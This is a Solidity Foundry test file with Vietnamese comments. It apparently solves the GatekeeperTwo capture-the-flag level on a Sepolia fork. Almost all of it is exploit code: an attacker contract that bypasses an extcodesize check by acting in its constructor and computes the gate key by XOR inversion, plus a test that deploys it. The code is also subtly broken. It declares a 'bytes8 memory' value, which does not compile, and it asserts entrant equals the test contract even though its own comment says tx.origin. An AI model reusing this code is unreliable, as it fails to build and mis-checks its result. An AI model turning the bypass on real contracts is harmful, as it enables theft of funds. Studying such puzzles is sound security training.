// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

// 1. CONTRACT MÃ ĐỘC TẤN CÔNG CHÍNH
contract GatekeeperTwoAttacker {
    // Toàn bộ logic tấn công BẮT BUỘC nằm trong constructor để extcodesize == 0
    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);

        // Bước 1: Tính toán khóa gateKey dựa trên thuật toán XOR ngược của Gate Three
        bytes8 memory hashBase = bytes8(
            keccak256(abi.encodePacked(address(this)))
        );
        uint64 invertedHash = uint64(hashBase) ^ type(uint64).max;
        bytes8 gateKey = bytes8(invertedHash);

        // Bước 2: Thực hiện cuộc gọi xuyên phá vào mục tiêu
        target.enter(gateKey);
    }
}

// 2. KỊCH BẢN KIỂM TOÁN TỰ ĐỘNG (FOUNDRY TEST PoC)
contract GatekeeperTwoExploitTest is Test {
    IGatekeeperTwo public targetContract;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance bài GatekeeperTwo thực tế trên Sepolia của ông vào đây
        targetContract = IGatekeeperTwo(
            0x1234567890123456789012345678901234567890
        );
    }

    function test_GatekeeperTwoExploit() public {
        address playerAddress = address(this);

        // Khởi tạo contract tấn công. Cuộc tấn công sẽ tự kích hoạt ngay khi deploy
        new GatekeeperTwoAttacker(address(targetContract));

        // Khẳng định biến entrant đã bị ép ghi đè thành công về địa chỉ ví người chơi gốc (tx.origin)
        assertEq(
            targetContract.entrant(),
            playerAddress,
            "Audit failed: Entrant was not updated"
        );

        emit log(
            "Audit Verification: GatekeeperTwo successfully bypassed during constructor execution."
        );
    }
}
